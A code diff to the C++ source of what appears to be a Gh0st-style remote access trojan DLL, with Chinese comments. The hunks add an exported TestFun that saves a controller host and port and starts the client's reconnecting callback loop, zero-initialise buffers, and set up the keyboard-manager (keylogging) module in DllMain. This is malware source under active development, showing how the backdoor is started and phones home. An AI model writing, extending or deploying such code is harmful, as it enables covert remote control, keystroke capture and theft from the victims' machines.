@@ -30,8 +30,8 @@ LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
 DWORD WINAPI main(char *lpServiceName)
 {
 	// lpServiceName,在ServiceMain返回后就没有了
-	char	strServiceName[256];
-	char	strKillEvent[50];
+	char	strServiceName[256] = {0};
+	char	strKillEvent[50] = { 0 };
 	HANDLE	hInstallMutex = NULL;
 	//////////////////////////////////////////////////////////////////////////
 	// Set Window Station
@@ -42,10 +42,11 @@ DWORD WINAPI main(char *lpServiceName)
 	//
 	//////////////////////////////////////////////////////////////////////////
 
-
+	  //--这里判断CKeyboardManager::g_hInstance是否为空 如果不为空则开启错误处理
+	 //--这里要在dllmain中为CKeyboardManager::g_hInstance赋值
 	if (CKeyboardManager::g_hInstance != NULL)
 	{
-		//抛异常
+		//设置异常
 		SetUnhandledExceptionFilter(bad_exception);
 
 		lstrcpy(strServiceName, lpServiceName);
@@ -70,6 +71,8 @@ DWORD WINAPI main(char *lpServiceName)
 	//---这里声明了一个 CClientSocket类
 	CClientSocket socketClient;
 	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
+
+	//这个循环里判断是否连接成功如果不成功则继续向下
 	while (1)
 	{
 		// 如果不是心跳超时，不用再sleep两分钟
@@ -158,6 +161,16 @@ DWORD WINAPI main(char *lpServiceName)
 	CloseHandle(hInstallMutex);
 }
 
+extern "C" __declspec(dllexport) void TestFun(char* strHost, int nPort)
+{
+	strcpy(g_strHost, strHost);  //保存上线地址
+	g_dwPort = nPort;             //保存上线端口
+	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
+	//这里等待线程结束
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
+}
+
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
@@ -167,6 +180,10 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     {
     case DLL_PROCESS_ATTACH:
     case DLL_THREAD_ATTACH:
+		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
+		//CKeyboardManager::m_dwLastMsgTime = GetTickCount();
+		//CKeyboardManager::Initialization();
+		break;
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
         break;
